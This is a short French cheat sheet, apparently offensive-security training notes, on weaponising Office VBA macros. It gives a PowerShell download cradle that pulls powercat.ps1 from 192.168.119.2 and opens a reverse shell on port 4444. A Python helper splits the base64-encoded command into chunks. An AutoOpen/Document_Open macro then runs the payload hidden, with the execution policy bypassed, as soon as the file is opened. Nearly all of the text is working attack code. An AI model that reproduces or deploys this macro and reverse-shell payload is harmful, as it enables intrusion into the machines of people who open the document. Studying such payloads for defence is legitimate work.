# Macro Office (VBA)

## Payload PowerShell encodé en base64

> UTF-16LE est le charset par défaut pour l'encodage base64 de PowerShell - tout autre charset cassera le payload.

Commande à encoder (ex: download cradle + PowerCat) :

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

## Découper la chaîne base64 pour la macro

La macro VBA a une limite de longueur par ligne - ce script Python découpe la chaîne en chunks de 50 caractères :

```python
import sys

str = "powershell.exe -nop -noni -w hidden -ep bypass -e " + sys.argv[1]  
# usage : python3 split.py "<BASE64_PAYLOAD>"
n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

> S'assurer que la chaîne base64 ne contient aucun saut de ligne avant de la coller dans le script.

## Macro VBA

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ' ... (coller les chunks générés par le script Python)
    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
    Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
    Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```
